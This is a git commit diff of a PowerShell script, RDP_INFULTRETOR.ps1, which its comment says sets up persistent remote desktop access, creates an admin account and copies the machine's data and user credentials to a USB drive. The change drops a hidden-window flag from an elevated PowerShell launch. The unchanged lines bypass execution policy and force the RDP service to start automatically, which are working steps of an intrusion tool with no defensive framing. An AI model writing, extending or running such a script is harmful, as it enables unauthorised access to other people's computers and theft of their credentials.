e13fb9daa173d04a613fa16dad08f0b0f83e7f99
Tamirmaidani <87255645+Tamirmaidani@users.noreply.github.com>
2023-03-15 13:37:58 +0200

    Update RDP_INFULTRETOR.ps1

--- RDP_INFULTRETOR.ps1
+++ RDP_INFULTRETOR.ps1
@@ -5,7 +5,7 @@
 # REM  create constent remote rdp , create a user with admin rights and send the data of the pc with user creds  to a usb 
 # mass storage device that is connected
 
-Start-Process powershell -Verb runAs -WindowStyle hidden
+Start-Process powershell -Verb runAs
 Set-ExecutionPolicy Bypass -Force
 Set-Service -Name TermService -StartupType Automatic
 Start-Service TermService
